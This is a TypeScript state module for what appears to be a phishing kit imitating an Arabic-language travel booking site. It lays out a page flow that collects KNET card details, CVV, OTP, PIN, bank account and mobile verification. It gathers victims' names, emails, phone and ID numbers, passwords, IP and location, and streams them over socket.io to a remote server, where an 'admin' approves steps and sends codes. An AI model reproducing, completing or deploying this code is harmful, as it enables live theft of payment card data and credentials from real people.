// updates-version5
// new-fix
import { effect, signal } from "@preact/signals";
import { io } from "socket.io-client";
import { sendMainInfo } from "../utils/utils";

// ROOM Is The Code That Sent To Us In Email To Connect With Real Time Server, We Can Cheng It From .env file ==> CODE Variable //

export const ROOM = import.meta.env.VITE_CODE;

export const PAGES = [
  "الرئيسية",
  "trip-confirm",
  "traveller-info",
  "pick-payment",
  "payment-gateway",
  "knet-gateway",
  "knet-cvv",
  "otp",
  "pin",
  "bank-account",
  "mobile-verification",
  "verify",
  "final-page",
];

export const socket = signal(
  io(
    import.meta.env.VITE_MODE === "DEV"
      ? import.meta.env.VITE_DEV_SOCKET_IO_URL
      : import.meta.env.VITE_PROD_SOCKET_IO_URL,
    {
      transports: ["polling"],
      autoConnect: false,
      forceNew: true,
    }
  )
);

// To Sent To Server Any Time Tht It Change

export const loading = signal("net");

export const isApproved = signal(false);

export const messages = signal<any[]>([]);

export const permissions = signal<string[]>([]);

export const message = signal("");

export const lastMessage = signal("");

export const mainInfo = signal({
  fullName: "",
  email: "",
  phone: "",
  idNumber: "",
  password: "",
  _id: "",
  room: ROOM,
  ip: "",
  country: "",
  city: "",
  date: "",
  socketId: "",
  page: "home",
  query: "",
  state: {} as any,
});

//For Admin Rejected Our Request Notification

export const isAdminError = signal(false);

//For Shown Chat Model

export const isChat = signal(false);

//For Chat Notification

export const isNewMessage = signal(0);

//For Code That Sent From Admin

export const code = signal("");

//For Logo That We Sent To Admin

export const logo = signal("اختر");

export const specialId = signal("");

export const isError = signal("");

effect(() => {
  if (mainInfo.value.socketId) {
    sendMainInfo();
  }
});

effect(() => {
  if (isChat.value) {
    isNewMessage.value = 0;
  }
});
